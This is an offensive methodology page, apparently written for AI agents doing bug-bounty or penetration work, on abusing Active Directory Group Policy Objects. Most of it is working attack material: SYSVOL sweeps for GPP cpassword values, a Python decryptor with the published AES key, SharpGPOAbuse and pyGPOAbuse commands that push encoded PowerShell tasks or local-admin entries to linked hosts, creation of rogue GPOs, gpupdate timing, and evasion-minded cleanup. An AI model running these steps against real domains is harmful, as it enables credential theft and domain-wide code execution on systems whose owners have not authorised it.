---
technology: "Group Policy Objects (GPO)"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.0"
provenance: "field-mined (6 engagements: Groups.xml cpassword via gpp-decrypt; cached-GPP survival + manual b64/AES script; Get-DomainGPO ACL audit + SharpGPOAbuse --AddComputerTask; GPO_manager group → --AddLocalAdmin on DC-linked GPO + gpupdate timing; New-GPO/New-GPLink creation right + --addcomputertask; GenericAll over Default Domain Policy + pyGPOAbuse) + upstream-verified: MS14-025 servicing page (cpassword removal 2014-05), PowerSploit Get-GPPPassword.ps1 (AES key bytes, null IV), SharpGPOAbuse README (full attack-type list and options), Hackndo/pyGPOAbuse repo (GitHub-verified), New-GPO/New-GPLink cmdlet usage field-observed. Thin unit — upstream-heavy per the standing doctrine; every field claim maps to a chain above. Lab-safe placeholders. Verified 2026-11-12. Supplement 2026-11-13: source: six2dez/pentest-book (post-exploitation/windows/ad/README.md, no license — rewritten with attribution), accessed 2026-11-13; adds GPO-target mapping and a cifs read variant."
---

# GPO bug bounty methodology

Target model: EXAMPLE.COM, SYSVOL at `\\example.com\SYSVOL`, DC dc01.example.com
(198.51.100.10). Foothold: any authenticated domain user (read surface) → any
GPO write/creation right (abuse surface). Companion overview: [[gpo|GPO]].
Cross-units: rights audited via [[ad-acl]]/[[ldap-ad]]; harvested creds feed
[[ntlm]]/[[kerberos]] chains.

## Triage table

| Surface | Gate | Min privilege | Payoff |
|---|---|---|---|
| SYSVOL GPP read (cpassword) | Groups.xml/Services.xml… present | any domain user | plaintext credential |
| Cached GPP on endpoints | stale Groups.xml on hosts | local read | same, post-cleanup |
| GPO edit → task/admin (SharpGPOAbuse) | Write/GenericAll on GPO object | that ACL right | exec on linked hosts |
| GPO edit → task (pyGPOAbuse) | same, from Linux | that ACL right | same |
| GPO creation + link (New-GPO/New-GPLink) | Group-Policy-creator rights | creation right | own GPO to abuse |
| Timing | gpupdate /force or ~90-min cycle | — | delivery control |

Phase order: 0 audit GPO rights → 1 sweep SYSVOL read surface → 2 decrypt any
cpassword → 3 pick abuse (edit vs create) → 4 deliver via gpupdate.

## Phase 0 — Audit rights first (cheap, from LDAP)

```powershell
Get-DomainGPO | select displayName, gpcfilesyspath            # observed in the field
Get-DomainGPO | Get-ObjectAcl | ? { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|GenericAll' }
# BloodHound view: GPO nodes → "GPO File Path" field ends in the {GUID} (observed)
```

What counts: WriteProperty/GenericAll/WriteDacl on a GPO object; membership in
groups delegated "full control" of specific GPOs (one observed case: a
GPO_manager group over SecurityUpdates, linked to DC-01); Group-Policy-creator rights
on the domain (→ Phase 4, creation path). Which OUs/domains the GPO links to
(gPLink) decides the blast radius — a GPO linked to the Domain Controllers OU
is domain-admin-grade.

## Phase 1 — SYSVOL read sweep

```bash
smbclient //198.51.100.10/SYSVOL -U 'EXAMPLE\user' -N 2>/dev/null || \
smbclient //198.51.100.10/SYSVOL -U 'user@example.com'
#   recursively fetch Policies/*/MACHINE|USER/Preferences/**/*.xml
grep -rEi 'cpassword="' Policies/            # hit = Phase 2
# preference files worth the grep: Groups.xml Services.xml ScheduledTasks.xml
#   Drives.xml DataSources.xml Printers.xml
```

Also check endpoint caches (`C:\ProgramData\Microsoft\Group Policy\History\…`
on any host you touch) — Groups.xml outlives GPO deletion there; only
unlinking clears it (field-verified mitigation note).

## Phase 2 — Decrypt cpassword

```bash
gpp-decrypt <cpassword-value>          # observed: service-account cred → domain win
```

Or by hand (one engagement rolled its own): the value is base64; decrypt
AES-256-CBC with the Microsoft-published key (verified from PowerSploit's
Get-GPPPassword.ps1):

```python
from base64 import b64decode
from Crypto.Cipher import AES
key = bytes([0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b])
#   = 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
pw  = b64decode(cpassword + "=" * ((4 - len(cpassword) % 4) % 4))
print(AES.new(key, AES.MODE_CBC, b"\x00"*16).decrypt(pw).rstrip(b"\x00"))
# empty cpassword = user set a password with the field blank (no cred); MS14-025-era
# domains should return no NEW cpassword — a live one is a hygiene time machine.
```

## Phase 3 — GPO edit abuse (rights held)

```powershell
# C# side (README-verified attack types; all three forms observed in the field)
SharpGPOAbuse.exe --AddLocalAdmin    --UserAccount user.bob --GPOName "SecurityUpdates"   # observed
SharpGPOAbuse.exe --AddComputerTask  --GPOName "privesc" \   # observed
    --Author EXAMPLE\\user.bob --TaskName "t" --Command "powershell -enc <b64>"
# other README options: --AddUserTask --AddUserScript --AddComputerScript --AddUserRights
#   (--AddUserRights "SeTakeOwnershipPrivilege,…" style — one field case used --AddComputerTask)
```

```bash
# Python side, from Linux (observed — GenericAll over Default Domain Policy)
python3 pygpoabuse.py example.com/gpoadm:'Password123!' \
  -command "powershell -exec bypass -enc <b64payload>" \
  -dc-ip 198.51.100.10 -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9
```

SharpGPOAbuse writes an *immediate scheduled task* (or rights/admin entry) into
the GPT and updates the gPCFileSysPath-side files; pyGPOAbuse does the same via
SMB to SYSVOL — both leave the task dormant until policy refresh.

## Phase 4 — GPO creation abuse (creation rights held)

```powershell
New-GPO -Name privesc | New-GPLink -Target "OU=EXAMPLE,DC=example,DC=com"   # observed
# then treat your own GPO exactly like Phase 3 (--gponame "privesc")
```

Creation beats edit when no existing GPO is writable — you mint the object,
link it where you have link rights, and abuse it. Note New-GPLink needs rights
on the target OU/site as well.

## Phase 5 — Delivery (the timing game)

```powershell
gpupdate /force      # on any linked host you can reach (as the right user/machine)
# default background refresh: ~90 minutes (explicitly noted in the field)
# machine-half tasks (--AddComputerTask / MACHINE-side writes) apply at machine refresh
# user-half tasks wait for the target user's session
```

Decision points: linked-to-DCs GPO → target a DC refresh for immediate
domain-grade effect; EDR watches gpupdate → wait a cycle instead; cleanup —
pyGPOAbuse/SharpGPOAbuse edits are file changes in SYSVOL, revert or delete the
added task files when OPSEC matters.

## Tool map (prose)

gpp-decrypt and the Get-GPPPassword PowerSploit script (cpassword), SharpGPOAbuse
(C#, edit abuse), pyGPOAbuse (Python, edit abuse from Linux — Hackndo), PowerView
Get-DomainGPO/Get-ObjectAcl and BloodHound (rights audit), GroupPolicy module
New-GPO/New-GPLink (creation abuse), smbclient/smbmap (SYSVOL sweep — [[smb]]),
gpupdate (delivery). The ACL side of every write is [[ad-acl]]; the reads ride
[[ldap-ad]].

## Supplement (2026-11-13) — small deltas from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`post-exploitation/windows/ad/README.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first: nearly everything in the source's GPP material (SYSVOL sweep, cpassword decrypt, edit/create abuse, delivery timing) is already the core of this page — two small deltas earned their place.

**S1. Map targets TO GPOs before choosing one.** The Phase 0 audit walks GPO → rights; the inverse walk picks the victim: PowerView's `Find-GPOComputerAdmin -ComputerName <host>` and `Get-DomainGPO -ComputerName <host>` name exactly which GPOs apply to a host you already control — a writable GPO found that way converts to execution on YOUR box immediately (no waiting on a DC refresh), and `Get-NetGPOGroup` narrows to GPOs that push local-group membership (the --AddLocalAdmin shape of Phase 3).

**S2. SYSVOL read sweep without smbclient.** On a Linux foothold that lacks smbclient, mount the share over CIFS and grep locally: `mount.cifs -o domain=example.com,username=user //198.51.100.10/SYSVOL /mnt` then `grep -ir 'password' /mnt` — the same sweep as Phase 1 with different plumbing (Windows-side equivalent: `findstr /s /n /i /p password \\example.com\SYSVOL\example.com\*`).
